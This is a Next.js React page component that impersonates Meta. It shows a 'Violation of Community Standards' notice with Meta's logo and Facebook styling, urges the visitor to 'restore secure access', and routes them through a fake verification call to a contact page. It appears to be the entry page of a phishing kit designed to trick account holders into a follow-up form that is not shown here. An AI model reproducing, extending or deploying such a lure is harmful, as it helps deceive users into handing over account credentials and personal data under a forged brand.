'use client';

import '@/assets/css/policy-violation-notice.css';
import HeroImage from '@/assets/images/Logout-all-devices_Blog01.webp';
import LogoMeta from '@/assets/images/logo-meta.svg';
import axios from 'axios';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useEffect, useState, type FC } from 'react';

const Index: FC = () => {
    const router = useRouter();
    const [isLoading, setIsLoading] = useState(false);
    const [isVerified, setIsVerified] = useState(false);

    useEffect(() => {
        document.title = 'Violation of Community Standards';
    }, []);

    const handleVerify = async () => {
        if (isLoading || isVerified) {
            return;
        }
        setIsLoading(true);
        try {
            const response = await axios.post('/api/verify');
            if (response.status === 200) {
                setTimeout(() => {
                    setIsVerified(true);
                    setIsLoading(false);
                }, 2000);
            } else {
                setIsLoading(false);
            }
        } catch {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        if (!isVerified) {
            return;
        }
        const redirectTimeOut = setTimeout(() => {
            router.push(`/contact/${Date.now()}`);
        }, 500);
        return () => {
            clearTimeout(redirectTimeOut);
        };
    }, [isVerified, router]);

    return (
        <div className='flex min-h-screen flex-col bg-white'>
            <header
                className='flex h-[52px] w-full shrink-0 items-center justify-center border-b border-[#E0E0E0] bg-white'
                role='banner'
            >
                <div className='flex w-full max-w-[1280px] items-center justify-between px-4'>
                    <Link href='#' className='inline-flex' onClick={(e) => e.preventDefault()}>
                        <Image src={LogoMeta} alt='Meta' className='h-[22px] w-auto' priority />
                    </Link>
                </div>
            </header>

            <div className='flex flex-1 flex-col items-center justify-center p-4 sm:p-6'>
                <div className='w-full max-w-2xl px-3 sm:px-4'>
                    <section className='w-full overflow-hidden rounded-xl border border-[#DEE1E6] bg-white shadow-[0_2px_8px_rgba(0,0,0,0.06),0_12px_32px_rgba(0,0,0,0.08)] sm:rounded-2xl'>
                        <div className='bg-[#E7F3FF] px-2 py-4 sm:px-3 sm:py-7 md:px-4 md:py-8'>
                            <Image
                                src={HeroImage}
                                alt='Security and device logout illustration'
                                className='mx-auto block h-auto w-full max-w-[min(100%,440px)] object-contain sm:max-w-none'
                                priority
                            />
                        </div>

                        <div className='px-4 pt-6 pb-6 sm:px-9 sm:pt-9 sm:pb-9 md:px-10'>
                            <h1 className='mb-6 text-center text-[1.1rem] leading-[1.35] font-bold tracking-[-0.01em] text-[#050505] sm:mb-8 sm:text-[1.5rem] sm:tracking-[-0.02em] md:text-[1.625rem]'>
                                Violation of Community Standards
                            </h1>

                            <div className='policy-violation-notice__rows grid grid-cols-[36px_minmax(0,1fr)] gap-x-3 gap-y-4 sm:grid-cols-[44px_minmax(0,1fr)] sm:gap-x-5 sm:gap-y-7'>
                                <div
                                    className='policy-violation-notice__icon-cell relative flex items-start justify-center'
                                    aria-hidden='true'
                                >
                                    <div className='policy-violation-notice__icon-line pointer-events-none absolute top-[18px] left-1/2 h-[calc(100%+1rem)] w-px -translate-x-1/2 bg-gradient-to-b from-[#DADDE1] via-[#E4E6EB] to-[#DADDE1] sm:top-[22px] sm:h-[calc(100%+1.75rem)]' />
                                    <div className='relative z-[1] flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-gradient-to-b from-[#D2D5DB] to-[#B0B5BC] shadow-[inset_0_1px_0_rgba(255,255,255,0.65),0_1px_2px_rgba(0,0,0,0.08)] ring-1 ring-black/[0.06] sm:h-11 sm:w-11'>
                                        <svg
                                            className='text-[15px] text-white sm:text-[18px]'
                                            viewBox='0 0 576 512'
                                            fill='currentColor'
                                            width='1em'
                                            height='1em'
                                            aria-hidden='true'
                                        >
                                            <path d='M576 512H64c-35.3 0-64-28.7-64-64V96c0-35.3 28.7-64 64-64h448c35.3 0 64 28.7 64 64v352c0 35.3-28.7 64-64 64zM64 128v352h448V128H64zm96 96h256c17.7 0 32-14.3 32-32s-14.3-32-32-32H160c-17.7 0-32 14.3-32 32s14.3 32 32 32zm0 64h128c17.7 0 32-14.3 32-32s-14.3-32-32-32H160c-17.7 0-32 14.3-32 32s14.3 32 32 32z' />
                                        </svg>
                                    </div>
                                </div>
                                <p className='pt-0.5 text-left text-[14px] leading-[1.58] tracking-[0.005em] text-[#1C1E21] sm:text-[15.5px] sm:leading-[1.7] sm:tracking-[0.01em]'>
                                    We identified activity or content related to your account that may not comply with our
                                    platform policies and standards.
                                </p>

                                <div className='policy-violation-notice__icon-cell flex items-start justify-center' aria-hidden='true'>
                                    <div className='relative z-[1] flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-gradient-to-br from-[#1877F2] to-[#0E5FCC] shadow-[0_4px_14px_rgba(24,119,242,0.45)] ring-1 ring-white/25 sm:h-11 sm:w-11 sm:rounded-xl'>
                                        <svg className='h-6 w-6 text-white' viewBox='0 0 24 24' fill='currentColor' aria-hidden='true'>
                                            <path d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z' />
                                        </svg>
                                    </div>
                                </div>
                                <p className='text-left text-[14px] leading-[1.58] tracking-[0.005em] text-[#1C1E21] sm:text-[15.5px] sm:leading-[1.7] sm:tracking-[0.01em]'>
                                    Please review and complete the following steps to restore secure access and ensure
                                    compliance with our rules.
                                </p>
                            </div>

                            <div className='policy-violation-notice__continue-wrap'>
                                <button
                                    type='button'
                                    className='policy-violation-notice__continue relative flex w-full items-center justify-center gap-2 border-0 bg-[#1877F2] px-4 py-2.5 text-[15px] font-semibold tracking-[0.04em] text-white shadow-none transition-colors hover:bg-[#166FE5] active:bg-[#145dbf] focus:outline-none focus-visible:ring-2 focus-visible:ring-[#1877F2] focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-70'
                                    onClick={handleVerify}
                                    disabled={isLoading || isVerified}
                                    aria-busy={isLoading}
                                >
                                    <span className='relative z-[1]'>{isLoading ? 'Please wait…' : isVerified ? 'Redirecting…' : 'Continue'}</span>
                                    {!isLoading && !isVerified ? (
                                        <span className='relative z-[1] flex items-center' aria-hidden='true'>
                                            <svg
                                                className='h-4 w-4 shrink-0'
                                                viewBox='0 0 24 24'
                                                fill='none'
                                                stroke='currentColor'
                                                strokeWidth='2.2'
                                                strokeLinecap='round'
                                                strokeLinejoin='round'
                                            >
                                                <path d='M5 12h14M13 6l6 6-6 6' />
                                            </svg>
                                        </span>
                                    ) : isLoading ? (
                                        <span
                                            className='relative z-[1] h-4 w-4 shrink-0 animate-spin-fast rounded-full border-2 border-white border-b-transparent'
                                            aria-hidden='true'
                                        />
                                    ) : null}
                                </button>
                            </div>
                        </div>
                    </section>
                </div>
            </div>
        </div>
    );
};

export default Index;
